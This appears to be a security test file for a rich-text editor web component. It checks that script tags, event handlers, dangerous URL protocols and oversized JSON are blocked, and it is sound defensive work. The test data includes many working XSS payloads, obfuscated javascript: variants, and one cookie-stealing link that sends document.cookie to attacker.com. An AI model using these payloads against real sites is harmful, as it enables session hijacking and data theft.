import { expect, fixture, html } from '@open-wc/testing';
import sinon from 'sinon';
import { RichTextContextComponent } from './rich-text-context';
import { RichTextRendererComponent } from './rich-text-renderer';
import type { RichTextFeatureLinkComponent } from './features/rte-link';

import './rich-text-context';
import './rich-text-renderer';
import './features/rte-link';

describe('Security: XSS Prevention', () => {
  describe('Security Hardening - Insecure Properties Removed', () => {
    it('should not expose validateUrls property on rte-link', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rte-link></forge-rte-link>
        </forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;

      // Property should not exist in the public API
      expect(link).to.not.have.property('validateUrls');
    });

    it('should not expose suppressErrors property on rich-text-context', async () => {
      const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);

      await new Promise(resolve => setTimeout(resolve, 100));

      // Property should not exist in the public API
      expect(el).to.not.have.property('suppressErrors');
    });

    it('should always validate URLs even if validate-urls attribute is set', async () => {
      // Even if someone tries to set the attribute in HTML, validation should still run
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rte-link validate-urls="false"></forge-rte-link>
        </forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
      (link as any)._linkUrl = 'javascript:alert(1)';
      (link as any)._validateUrl();

      // Should still show validation error
      expect((link as any)._validationError).to.include('Invalid protocol');
    });

    it('should always log security warnings even if suppress-errors attribute is set', async () => {
      const spy = sinon.spy(console, 'warn');

      try {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context suppress-errors="true"></forge-rich-text-context>
        `);

        await new Promise(resolve => setTimeout(resolve, 100));

        // Trigger a security warning by injecting dangerous protocol
        (el as any).content = {
          type: 'doc',
          content: [
            {
              type: 'paragraph',
              content: [
                {
                  type: 'text',
                  text: 'Link',
                  marks: [{ type: 'link', attrs: { href: 'javascript:alert(1)' } }]
                }
              ]
            }
          ]
        };
        await el.updateComplete;

        // Should still log warning even with suppress-errors="true"
        expect(spy.calledWith(sinon.match(/Blocked dangerous protocol/))).to.be.true;
      } finally {
        spy.restore();
      }
    });
  });

  describe('HTML Output Encoding', () => {
    it('should escape script tags in toHTML()', async () => {
      const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);

      // Wait for editor initialization
      await new Promise(resolve => setTimeout(resolve, 100));

      // Inject malicious content via setContent API
      el.content = '<p><script>alert(1)</script></p>';
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.include('&lt;script&gt;');
      expect(output).to.not.include('<script>alert');
    });

    it('should escape img onerror in toHTML()', async () => {
      const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);

      await new Promise(resolve => setTimeout(resolve, 100));

      el.content = '<p><img src=x onerror=alert(1)></p>';
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('onerror=');
    });

    it('should escape HTML entities in text content', async () => {
      const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const malicious = {
        type: 'doc',
        content: [
          {
            type: 'paragraph',
            content: [
              {
                type: 'text',
                text: '<script>alert("XSS")</script>'
              }
            ]
          }
        ]
      };

      (el as any).content = malicious;
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.include('&lt;script&gt;');
      expect(output).to.not.include('<script>alert');
    });

    it('should remove dangerous elements from output', async () => {
      const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);

      await new Promise(resolve => setTimeout(resolve, 100));

      el.content = '<p>Safe text</p><iframe src="evil.com"></iframe><script>alert(1)</script>';
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('<iframe');
      expect(output).to.not.include('<script>');
      expect(output).to.include('Safe text');
    });

    it('should remove event handler attributes', async () => {
      const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);

      await new Promise(resolve => setTimeout(resolve, 100));

      el.content = '<p onclick="alert(1)" onmouseover="evil()">Text</p>';
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('onclick=');
      expect(output).to.not.include('onmouseover=');
    });
  });

  describe('Link Protocol Validation', () => {
    it('should block javascript: protocol', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rte-link></forge-rte-link>
        </forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
      (link as any)._linkUrl = 'javascript:alert(1)';
      (link as any)._validateUrl();

      expect((link as any)._validationError).to.include('Invalid protocol');
    });

    it('should block data: URLs', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rte-link></forge-rte-link>
        </forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
      (link as any)._linkUrl = 'data:text/html,<script>alert(1)</script>';
      (link as any)._validateUrl();

      expect((link as any)._validationError).to.include('Invalid protocol');
    });

    it('should block vbscript: protocol', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rte-link></forge-rte-link>
        </forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
      (link as any)._linkUrl = 'vbscript:alert(1)';
      (link as any)._validateUrl();

      expect((link as any)._validationError).to.include('Invalid protocol');
    });

    it('should block file: protocol', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rte-link></forge-rte-link>
        </forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
      (link as any)._linkUrl = 'file:///etc/passwd';
      (link as any)._validateUrl();

      expect((link as any)._validationError).to.include('Invalid protocol');
    });

    it('should block URL-encoded javascript: protocol', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rte-link></forge-rte-link>
        </forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
      (link as any)._linkUrl = 'java%09script:alert(1)'; // Tab character
      (link as any)._validateUrl();

      expect((link as any)._validationError).to.include('Invalid protocol');
    });

    it('should block obfuscated protocols in URL', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rte-link></forge-rte-link>
        </forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
      (link as any)._linkUrl = 'https://example.com?redirect=javascript:alert(1)';
      (link as any)._validateUrl();

      expect((link as any)._validationError).to.include('Invalid protocol detected');
    });

    it('should allow valid https URLs', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rte-link></forge-rte-link>
        </forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
      (link as any)._linkUrl = 'https://example.com';
      (link as any)._validateUrl();

      expect((link as any)._validationError).to.equal('');
    });

    it('should allow valid http URLs', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rte-link></forge-rte-link>
        </forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
      (link as any)._linkUrl = 'http://example.com/path?query=value';
      (link as any)._validateUrl();

      expect((link as any)._validationError).to.equal('');
    });
  });

  describe('JSON Input Sanitization', () => {
    it('should sanitize javascript: links in JSON', async () => {
      const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const malicious = {
        type: 'doc',
        content: [
          {
            type: 'paragraph',
            content: [
              {
                type: 'text',
                text: 'Click here',
                marks: [
                  {
                    type: 'link',
                    attrs: { href: 'javascript:alert(1)' }
                  }
                ]
              }
            ]
          }
        ]
      };

      (el as any).content = malicious;
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('javascript:');
      expect(output).to.include('href="#"'); // Replaced with safe default
    });

    it('should sanitize data: URLs in JSON', async () => {
      const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const malicious = {
        type: 'doc',
        content: [
          {
            type: 'paragraph',
            content: [
              {
                type: 'text',
                text: 'Click',
                marks: [
                  {
                    type: 'link',
                    attrs: { href: 'data:text/html,<script>alert(1)</script>' }
                  }
                ]
              }
            ]
          }
        ]
      };

      (el as any).content = malicious;
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('data:text/html');
      expect(output).to.include('href="#"');
    });

    it('should reject deeply nested JSON (DoS prevention)', async () => {
      const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);

      await new Promise(resolve => setTimeout(resolve, 100));

      // Create deeply nested structure (51 levels - exceeds MAX_DEPTH of 50)
      const deep: any = { type: 'doc', content: [] };
      let current: any = deep.content;
      for (let i = 0; i < 51; i++) {
        const node = { type: 'paragraph', content: [] };
        current.push(node);
        current = node.content;
      }

      let errorThrown = false;
      try {
        (el as any).content = deep;
        await el.updateComplete;
      } catch (e) {
        errorThrown = true;
        expect((e as Error).message).to.include('Maximum nesting depth');
      }

      expect(errorThrown).to.be.true;
    });

    it('should reject extremely large JSON structures (DoS prevention)', async () => {
      const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);

      await new Promise(resolve => setTimeout(resolve, 100));

      // Create structure with too many nodes (exceeds MAX_NODES of 5000)
      const huge = {
        type: 'doc',
        content: Array(5001)
          .fill(null)
          .map(() => ({
            type: 'paragraph',
            content: [{ type: 'text', text: 'x' }]
          }))
      };

      let errorThrown = false;
      try {
        (el as any).content = huge;
        await el.updateComplete;
      } catch (e) {
        errorThrown = true;
        expect((e as Error).message).to.include('Maximum node count');
      }

      expect(errorThrown).to.be.true;
    });

    it('should sanitize URL-encoded dangerous protocols in JSON', async () => {
      const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const malicious = {
        type: 'doc',
        content: [
          {
            type: 'paragraph',
            content: [
              {
                type: 'text',
                text: 'Link',
                marks: [
                  {
                    type: 'link',
                    attrs: { href: 'java%09script:alert(1)' }
                  }
                ]
              }
            ]
          }
        ]
      };

      (el as any).content = malicious;
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('javascript');
      expect(output).to.include('href="#"');
    });

    it('should handle nested link marks safely', async () => {
      const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const malicious = {
        type: 'doc',
        content: [
          {
            type: 'paragraph',
            content: [
              {
                type: 'text',
                text: 'Text',
                marks: [
                  { type: 'bold' },
                  {
                    type: 'link',
                    attrs: { href: 'javascript:alert(1)' }
                  },
                  { type: 'italic' }
                ]
              }
            ]
          }
        ]
      };

      (el as any).content = malicious;
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('javascript:');
    });
  });

  describe('Renderer Security', () => {
    it('should sanitize javascript: links in renderer', async () => {
      const el = await fixture<RichTextRendererComponent>(html`
        <forge-rich-text-renderer></forge-rich-text-renderer>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const malicious = {
        type: 'doc',
        content: [
          {
            type: 'paragraph',
            content: [
              {
                type: 'text',
                text: 'Click',
                marks: [
                  {
                    type: 'link',
                    attrs: { href: 'javascript:alert(1)' }
                  }
                ]
              }
            ]
          }
        ]
      };

      (el as any).content = malicious;
      await el.updateComplete;

      const links = el.shadowRoot!.querySelectorAll('a');
      links.forEach(link => {
        expect(link.href).to.not.include('javascript:');
      });
    });

    it('should sanitize data: URLs in renderer', async () => {
      const el = await fixture<RichTextRendererComponent>(html`
        <forge-rich-text-renderer></forge-rich-text-renderer>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const malicious = {
        type: 'doc',
        content: [
          {
            type: 'paragraph',
            content: [
              {
                type: 'text',
                text: 'Data URL',
                marks: [
                  {
                    type: 'link',
                    attrs: { href: 'data:text/html,<script>alert(1)</script>' }
                  }
                ]
              }
            ]
          }
        ]
      };

      (el as any).content = malicious;
      await el.updateComplete;

      const links = el.shadowRoot!.querySelectorAll('a');
      links.forEach(link => {
        expect(link.href).to.not.include('data:text/html');
      });
    });

    it('should handle deeply nested content in renderer', async () => {
      const el = await fixture<RichTextRendererComponent>(html`
        <forge-rich-text-renderer></forge-rich-text-renderer>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      // Create deeply nested structure
      const deep: any = { type: 'doc', content: [] };
      let current: any = deep.content;
      for (let i = 0; i < 51; i++) {
        const node = { type: 'paragraph', content: [] };
        current.push(node);
        current = node.content;
      }

      // Should gracefully handle error and show empty content
      el.content = deep;
      await el.updateComplete;

      const text = el.shadowRoot!.textContent?.trim();
      expect(text).to.equal('');
    });

    it('should handle large content safely in renderer', async () => {
      const el = await fixture<RichTextRendererComponent>(html`
        <forge-rich-text-renderer></forge-rich-text-renderer>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      // Create structure with too many nodes
      const huge = {
        type: 'doc',
        content: Array(5001)
          .fill(null)
          .map(() => ({
            type: 'paragraph',
            content: [{ type: 'text', text: 'x' }]
          }))
      };

      // Should gracefully handle error
      el.content = huge;
      await el.updateComplete;

      const text = el.shadowRoot!.textContent?.trim();
      expect(text).to.equal('');
    });
  });

  describe('Paste Handler Security', () => {
    it('should remove script elements from pasted HTML', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      // Simulate setting content with script
      el.content = '<p>Safe text</p><script>alert(1)</script>';
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('<script>');
      expect(output).to.include('Safe text');
    });

    it('should remove iframe elements from pasted HTML', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      el.content = '<p>Text</p><iframe src="evil.com"></iframe>';
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('<iframe');
    });

    it('should remove SVG elements with scripts', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      el.content = '<p>Text</p><svg onload="alert(1)"><script>alert(2)</script></svg>';
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('<svg');
      expect(output).to.not.include('onload');
    });

    it('should remove style attributes', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      el.content = '<p style="background:red">Text</p>';
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('style=');
    });

    it('should remove data attributes', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      el.content = '<p data-evil="payload">Text</p>';
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('data-evil');
    });
  });

  describe('Regression Tests - Ensure Security Measures Remain in Place', () => {
    describe('HTML Sanitization in toHTML()', () => {
      it('should always escape HTML entities in text content (prevent XSS)', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        // Test various XSS vectors
        const xssVectors = [
          '<script>alert(1)</script>',
          '<img src=x onerror=alert(1)>',
          '<svg onload=alert(1)>',
          '<iframe src="javascript:alert(1)"></iframe>',
          '<object data="javascript:alert(1)"></object>',
          '<embed src="javascript:alert(1)">',
          '<link rel=stylesheet href="javascript:alert(1)">',
          '<style>@import"javascript:alert(1)";</style>',
          '<form action="javascript:alert(1)"><button>Click</button></form>',
          '<input type=text onfocus=alert(1) autofocus>',
          '<video><source onerror=alert(1)></video>',
          '<audio src=x onerror=alert(1)>'
        ];

        for (const vector of xssVectors) {
          el.content = `<p>${vector}</p>`;
          await el.updateComplete;
          const output = el.toHTML();

          // Verify HTML entities are escaped
          expect(output).to.not.include('<script');
          expect(output).to.not.include('<img');
          expect(output).to.not.include('<svg');
          expect(output).to.not.include('<iframe');
          expect(output).to.not.include('<object');
          expect(output).to.not.include('<embed');
          expect(output).to.not.include('onerror=');
          expect(output).to.not.include('onload=');
        }
      });

      it('should escape angle brackets in all contexts', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        el.content = '<p>Test <test> value</p>';
        await el.updateComplete;

        const output = el.toHTML();
        expect(output).to.include('&lt;test&gt;');
        expect(output).to.not.match(/<test>/);
      });

      it('should escape quotes and apostrophes', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        el.content = '<p>Test "quotes" and \'apostrophes\'</p>';
        await el.updateComplete;

        const output = el.toHTML();
        // HTML entities should be escaped (quotes may be escaped or preserved)
        expect(output).to.match(/&quot;|"/);
        expect(output).to.match(/&#039;|'/);
      });

      it('should handle nested HTML entities correctly', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        el.content = '<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>';
        await el.updateComplete;

        const output = el.toHTML();
        // Should remain escaped, not double-escaped or unescaped
        expect(output).to.include('&lt;script&gt;');
        expect(output).to.not.include('<script>');
      });
    });

    describe('Protocol Validation - Always Block Dangerous Protocols', () => {
      it('should never allow javascript: protocol in any form', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const dangerousVariants = [
          'javascript:alert(1)',
          'JavaScript:alert(1)',
          'JAVASCRIPT:alert(1)',
          'java\nscript:alert(1)',
          'java\rscript:alert(1)',
          'java\tscript:alert(1)',
          ' javascript:alert(1)',
          'javascript :alert(1)',
          'java%0ascript:alert(1)',
          'java%0dscript:alert(1)',
          'java%09script:alert(1)',
          'jav&#x61;script:alert(1)',
          '&#106;avascript:alert(1)'
        ];

        for (const variant of dangerousVariants) {
          (el as any).content = {
            type: 'doc',
            content: [
              {
                type: 'paragraph',
                content: [
                  {
                    type: 'text',
                    text: 'Link',
                    marks: [{ type: 'link', attrs: { href: variant } }]
                  }
                ]
              }
            ]
          };
          await el.updateComplete;

          const output = el.toHTML();
          // Should be sanitized to # or blocked
          expect(output.toLowerCase()).to.not.include('javascript:');
        }
      });

      it('should never allow data: URLs', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const dataUrls = [
          'data:text/html,<script>alert(1)</script>',
          'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
          'DATA:text/html,<script>alert(1)</script>',
          'data:text/javascript,alert(1)',
          'data:image/svg+xml,<svg onload=alert(1)>'
        ];

        for (const url of dataUrls) {
          (el as any).content = {
            type: 'doc',
            content: [
              {
                type: 'paragraph',
                content: [
                  {
                    type: 'text',
                    text: 'Link',
                    marks: [{ type: 'link', attrs: { href: url } }]
                  }
                ]
              }
            ]
          };
          await el.updateComplete;

          const output = el.toHTML();
          expect(output.toLowerCase()).to.not.include('data:');
        }
      });

      it('should never allow file:, vbscript:, about:, or blob: protocols', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const dangerousProtocols = [
          'file:///etc/passwd',
          'vbscript:msgbox(1)',
          'about:blank',
          'blob:https://example.com/uuid'
        ];

        for (const protocol of dangerousProtocols) {
          (el as any).content = {
            type: 'doc',
            content: [
              {
                type: 'paragraph',
                content: [
                  {
                    type: 'text',
                    text: 'Link',
                    marks: [{ type: 'link', attrs: { href: protocol } }]
                  }
                ]
              }
            ]
          };
          await el.updateComplete;

          const output = el.toHTML();
          const protocolName = protocol.split(':')[0].toLowerCase();
          expect(output.toLowerCase()).to.not.include(`${protocolName}:`);
        }
      });
    });

    describe('JSON Sanitization - Always Validate Input', () => {
      it('should always sanitize JSON input regardless of source', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const maliciousJson = {
          type: 'doc',
          content: [
            {
              type: 'paragraph',
              content: [
                {
                  type: 'text',
                  text: 'Click here',
                  marks: [
                    {
                      type: 'link',
                      attrs: {
                        href: 'javascript:document.location="http://attacker.com?cookie="+document.cookie'
                      }
                    }
                  ]
                }
              ]
            }
          ]
        };

        (el as any).content = maliciousJson;
        await el.updateComplete;

        const output = el.toHTML();
        expect(output.toLowerCase()).to.not.include('javascript:');
      });

      it('should enforce maximum depth limit to prevent DoS', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        // Create deeply nested structure
        let deepContent: any = { type: 'text', text: 'Deep' };
        for (let i = 0; i < 60; i++) {
          deepContent = {
            type: 'paragraph',
            content: [deepContent]
          };
        }

        const malicious = {
          type: 'doc',
          content: [deepContent]
        };

        try {
          (el as any).content = malicious;
          await el.updateComplete;
          // Should either throw or handle gracefully
        } catch (error) {
          expect((error as Error).message).to.include('depth');
        }

        // Editor should remain functional
        expect(el.isInitialized).to.be.true;
      });

      it('should enforce maximum node count to prevent DoS', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        // Create massive structure
        const hugeContent = {
          type: 'doc',
          content: Array(6000)
            .fill(null)
            .map(() => ({
              type: 'paragraph',
              content: [{ type: 'text', text: 'x' }]
            }))
        };

        try {
          (el as any).content = hugeContent;
          await el.updateComplete;
        } catch (error) {
          expect((error as Error).message).to.include('node count');
        }

        // Editor should remain functional
        expect(el.isInitialized).to.be.true;
      });

      it('should sanitize URL-encoded protocols in JSON', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const encodedAttacks = [
          'java%73cript:alert(1)',
          '%6A%61%76%61%73%63%72%69%70%74:alert(1)',
          'data%3Atext/html,<script>alert(1)</script>'
        ];

        for (const encoded of encodedAttacks) {
          (el as any).content = {
            type: 'doc',
            content: [
              {
                type: 'paragraph',
                content: [
                  {
                    type: 'text',
                    text: 'Link',
                    marks: [{ type: 'link', attrs: { href: encoded } }]
                  }
                ]
              }
            ]
          };
          await el.updateComplete;

          const output = el.toHTML();
          expect(output.toLowerCase()).to.not.include('javascript');
          expect(output.toLowerCase()).to.not.include('data:');
        }
      });
    });

    describe('Renderer Security - Must Sanitize Untrusted Content', () => {
      it('should always sanitize content in renderer (same as editor)', async () => {
        const renderer = await fixture<RichTextRendererComponent>(html`
          <forge-rich-text-renderer></forge-rich-text-renderer>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const malicious = {
          type: 'doc',
          content: [
            {
              type: 'paragraph',
              content: [
                {
                  type: 'text',
                  text: 'Malicious link',
                  marks: [{ type: 'link', attrs: { href: 'javascript:steal_data()' } }]
                }
              ]
            }
          ]
        };

        (renderer as any).content = malicious;
        await renderer.updateComplete;

        const renderedLinks = renderer.shadowRoot?.querySelectorAll('a');
        renderedLinks?.forEach(link => {
          const href = link.getAttribute('href') || '';
          expect(href.toLowerCase()).to.not.include('javascript:');
        });
      });

      it('should enforce same depth limits in renderer', async () => {
        const renderer = await fixture<RichTextRendererComponent>(html`
          <forge-rich-text-renderer></forge-rich-text-renderer>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        let deepContent: any = { type: 'text', text: 'Deep' };
        for (let i = 0; i < 60; i++) {
          deepContent = { type: 'paragraph', content: [deepContent] };
        }

        try {
          (renderer as any).content = { type: 'doc', content: [deepContent] };
          await renderer.updateComplete;
        } catch (error) {
          expect((error as Error).message).to.include('depth');
        }
      });

      it('should enforce same node count limits in renderer', async () => {
        const renderer = await fixture<RichTextRendererComponent>(html`
          <forge-rich-text-renderer></forge-rich-text-renderer>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const hugeContent = {
          type: 'doc',
          content: Array(6000)
            .fill(null)
            .map(() => ({ type: 'paragraph', content: [{ type: 'text', text: 'x' }] }))
        };

        try {
          (renderer as any).content = hugeContent;
          await renderer.updateComplete;
        } catch (error) {
          expect((error as Error).message).to.include('node count');
        }
      });
    });

    describe('Paste Handler Security - Must Remove Dangerous Elements', () => {
      it('should always remove SVG elements (security hardening)', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const svgAttacks = [
          '<svg onload=alert(1)></svg>',
          '<svg><script>alert(1)</script></svg>',
          '<svg><animate onbegin=alert(1)></animate></svg>',
          '<svg><set onbegin=alert(1)></set></svg>',
          '<math><maction actiontype=statusline#http://google.com>CLICKME</maction></math>'
        ];

        for (const svg of svgAttacks) {
          el.content = `<p>${svg}</p>`;
          await el.updateComplete;
          const output = el.toHTML();
          expect(output.toLowerCase()).to.not.include('<svg');
          expect(output.toLowerCase()).to.not.include('<math');
          expect(output.toLowerCase()).to.not.include('onload');
        }
      });

      it('should always remove audio and video elements', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const mediaAttacks = [
          '<audio src=x onerror=alert(1)></audio>',
          '<video><source onerror=alert(1)></video>',
          '<audio controls><source src="javascript:alert(1)"></audio>'
        ];

        for (const media of mediaAttacks) {
          el.content = `<p>${media}</p>`;
          await el.updateComplete;
          const output = el.toHTML();
          expect(output.toLowerCase()).to.not.include('<audio');
          expect(output.toLowerCase()).to.not.include('<video');
          expect(output.toLowerCase()).to.not.include('onerror');
        }
      });

      it('should always remove all event handler attributes', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const eventHandlers = [
          'onclick',
          'onload',
          'onerror',
          'onmouseover',
          'onfocus',
          'onblur',
          'onchange',
          'onsubmit',
          'onkeydown',
          'onkeyup',
          'onmouseenter',
          'onmouseleave'
        ];

        for (const handler of eventHandlers) {
          el.content = `<p><span ${handler}="alert(1)">Text</span></p>`;
          await el.updateComplete;
          const output = el.toHTML();
          expect(output.toLowerCase()).to.not.include(handler);
        }
      });

      it('should always remove inline style attributes', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        el.content = '<p style="background:url(javascript:alert(1))">Text</p>';
        await el.updateComplete;

        const output = el.toHTML();
        expect(output.toLowerCase()).to.not.include('style=');
      });

      it('should always remove data-* attributes', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        el.content = '<p data-payload="malicious" data-track="user">Text</p>';
        await el.updateComplete;

        const output = el.toHTML();
        expect(output).to.not.include('data-payload');
        expect(output).to.not.include('data-track');
      });
    });

    describe('Security Warnings - Must Always Log', () => {
      it('should log warnings when blocking dangerous protocols', async () => {
        const warnSpy = sinon.spy(console, 'warn');

        try {
          const el = await fixture<RichTextContextComponent>(html`
            <forge-rich-text-context></forge-rich-text-context>
          `);
          await new Promise(resolve => setTimeout(resolve, 100));

          (el as any).content = {
            type: 'doc',
            content: [
              {
                type: 'paragraph',
                content: [
                  {
                    type: 'text',
                    text: 'Link',
                    marks: [{ type: 'link', attrs: { href: 'javascript:alert(1)' } }]
                  }
                ]
              }
            ]
          };
          await el.updateComplete;

          // Should have logged a security warning
          expect(warnSpy.calledWith(sinon.match(/Blocked dangerous protocol/))).to.be.true;
        } finally {
          warnSpy.restore();
        }
      });

      it('should log errors when content sanitization fails', async () => {
        const errorSpy = sinon.spy(console, 'error');

        try {
          const el = await fixture<RichTextContextComponent>(html`
            <forge-rich-text-context></forge-rich-text-context>
          `);
          await new Promise(resolve => setTimeout(resolve, 100));

          // Create circular reference (will cause sanitization to fail)
          const circular: any = { type: 'doc', content: [] };
          circular.content.push(circular);

          try {
            el.content = circular;
            await el.updateComplete;
          } catch {
            // Expected to fail
          }

          // Should have logged an error
          expect(errorSpy.called).to.be.true;
        } finally {
          errorSpy.restore();
